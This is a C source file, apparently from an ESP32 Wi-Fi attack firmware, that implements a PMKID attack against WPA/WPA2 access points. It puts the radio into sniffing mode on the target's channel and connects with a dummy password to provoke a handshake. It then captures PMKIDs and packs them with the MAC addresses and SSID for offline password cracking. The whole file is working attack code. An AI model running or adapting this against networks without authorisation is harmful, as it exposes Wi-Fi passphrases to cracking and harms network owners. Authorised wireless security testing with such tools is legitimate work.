/**
 * @file attack_pmkid.c
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements PMKID attack.
 * 
 * @see PMKID attack reference - https://hashcat.net/forum/thread-7717.html
 */

#include "attack_pmkid.h"

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"

static const char* TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;
static bool is_running = false;
static bool event_handler_registered = false;

static void free_pmkid_items(pmkid_item_t *pmkid_item) {
    while (pmkid_item != NULL) {
        pmkid_item_t *next = pmkid_item->next;
        free(pmkid_item);
        pmkid_item = next;
    }
}

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 * 
 * If DATA_FRAME_EVENT_PMKID is received from event pool, this function stops PMKID attack and serialize 
 * captured PMKIDs into status content.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_PMKID
 * @param event_data expexcts pmkid_item_t *
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID, stopping attack...");
    const wifi_ap_record_t *captured_ap_record = ap_record;
    if (event_data == NULL || captured_ap_record == NULL) {
        attack_pmkid_stop();
        return;
    }

    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    if (pmkid_item_head == NULL) {
        attack_pmkid_stop();
        return;
    }

    attack_update_status(FINISHED);
    attack_pmkid_stop();
    
    // count how many PMKIDs in the list
    pmkid_item_t *pmkid_item = pmkid_item_head;
    unsigned pmkid_item_count = 1; 
    while((pmkid_item = pmkid_item->next) != NULL){
        pmkid_item_count++;
    }

    size_t ssid_len = strlen((char *) captured_ap_record->ssid);

    // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
    char *content = attack_alloc_result_content(6 + 6 + 1 + ssid_len + (pmkid_item_count * 16));
    if (content == NULL) {
        free_pmkid_items(pmkid_item_head);
        ESP_LOGE(TAG, "Failed to allocate PMKID result content");
        return;
    }

    wifictl_get_sta_mac((uint8_t *) content);
    content += 6;
    memcpy(content, captured_ap_record->bssid, 6);
    content += 6;
    content[0] = (char)ssid_len;
    content += 1;
    memcpy(content, captured_ap_record->ssid, ssid_len);
    content += ssid_len;

    // copy PMKIDs into continuous memory into "content" in status 
    pmkid_item = pmkid_item_head;
    do {
        pmkid_item_head = pmkid_item;
        memcpy(content, pmkid_item_head, 16);
        content += 16;
        pmkid_item = pmkid_item->next;
        free(pmkid_item_head);
    } while(pmkid_item != NULL);

    ESP_LOGD(TAG, "PMKID attack finished");
}

void attack_pmkid_start(attack_config_t *attack_config){
    if (attack_config == NULL || attack_config->target_count == 0 || attack_config->ap_records[0] == NULL) {
        ESP_LOGE(TAG, "PMKID attack start failed: missing target AP record");
        return;
    }

    if (is_running) {
        ESP_LOGW(TAG, "PMKID already running, stopping previous run first.");
        attack_pmkid_stop();
    }

    ESP_LOGI(TAG, "Starting PMKID attack...");
    ap_record = attack_config->ap_records[0];
    is_running = true;
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    wifictl_sta_connect_to_ap(ap_record, "dummypassword");
    esp_err_t err = esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "PMKID event handler register failed: %s", esp_err_to_name(err));
        wifictl_sta_disconnect();
        wifictl_sniffer_stop();
        frame_analyzer_capture_stop();
        is_running = false;
        ap_record = NULL;
        return;
    }
    event_handler_registered = true;
}

void attack_pmkid_stop(){
    if (!is_running && !event_handler_registered) {
        return;
    }

    bool was_running = is_running;
    is_running = false;
    if (was_running) {
        wifictl_sta_disconnect();
        wifictl_sniffer_stop();
        frame_analyzer_capture_stop();
    }

    if (event_handler_registered) {
        esp_err_t err = esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "PMKID event handler unregister failed: %s", esp_err_to_name(err));
        } else {
            event_handler_registered = false;
        }
    }
    if (was_running) {
        ap_record = NULL;
    }
    ESP_LOGD(TAG, "PMKID attack stopped");
}
